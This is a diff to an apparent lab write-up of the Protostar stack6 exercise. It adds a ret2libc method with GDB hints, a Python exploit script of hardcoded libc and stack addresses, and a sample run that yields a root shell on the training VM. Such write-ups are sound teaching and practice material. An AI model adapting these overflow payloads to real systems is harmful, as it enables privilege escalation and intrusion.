@@ -32,6 +32,7 @@ int main(int argc, char **argv)
 
 Aim: get the root shell
 
+Method 1:
 Here is the exploit (saved as `st6.py`):
 ```python
 import struct
@@ -57,4 +58,33 @@ input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 whoami
 root
 user@protostar:/opt/protostar/bin$
+```
+
+Method 2 (ret2libc):
+Hints:
+- `info proc map`: shows list of mapped memory regions in running process in GDB
+- `strings -a -t x <filepath>`: Gives strings with offset in hex
+- `/lib/libc-2.11.2.so`: Path of libc in protostar (got using `info proc map` in GDB)
+- `p system`: Useful for getting address of `system` using GDB
+
+Here is the exploit script (saved as `st6b.py`):
+```python
+import struct
+buffstart=0xbffff75c
+ebpval=0xbffff7a8
+padding='a'*(ebpval-buffstart)
+ebpnewval = struct.pack('<I',ebpval+0xf0)
+binshAddr = struct.pack('<I',0xb7e97000+0x11f3bf)
+eip       = struct.pack('<I',0xb7ecffb0) # Address of system
+retaddr_after_system='aaaa' # we don't care about this
+print padding+ebpnewval+eip+retaddr_after_system+binshAddr
+```
+
+Sample output:
+```bash
+user@protostar:/opt/protostar/bin$ (python ~/st6b.py;cat) | ./stack6
+input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa���aaaaaaaa�������aaaa�c��
+whoami
+root
+Segmentation fault
 ```
